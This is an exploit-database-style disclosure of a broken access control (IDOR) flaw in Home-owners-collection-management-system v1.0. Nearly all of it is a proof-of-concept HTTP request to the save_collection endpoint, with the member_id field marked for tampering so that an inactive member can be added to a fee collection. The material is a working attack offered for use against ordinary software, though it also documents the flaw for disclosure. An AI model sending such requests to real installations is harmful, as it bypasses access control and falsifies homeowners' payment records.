# Exploit Title: Home-owners-collection-management-system v1.0 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html
## Tested on: Debian Linux, Apache, Mysql
## Vendor: oretnom23
## Version: v1.0
## Exploit Description:
## Home-owners-collection-management-system v1.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add a member who is inactive to a collection(horizontal privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------
```
POST /hocms/classes/Master.php?f=save_collection HTTP/1.1
...
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="id"


------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="date_collected"

2023-10-04
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="collected_by"

user2
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="member_id"

4(CHANGE HERE)
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="fee[3]"

100
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="fee[4]"

100
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="fee[1]"

200
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="fee[5]"

50
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="fee[2]"

200
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="category_id[2]"

2
------WebKitFormBoundary3m9mLqErqI5Ro07b
Content-Disposition: form-data; name="total_amount"

200
------WebKitFormBoundary3m9mLqErqI5Ro07b--
```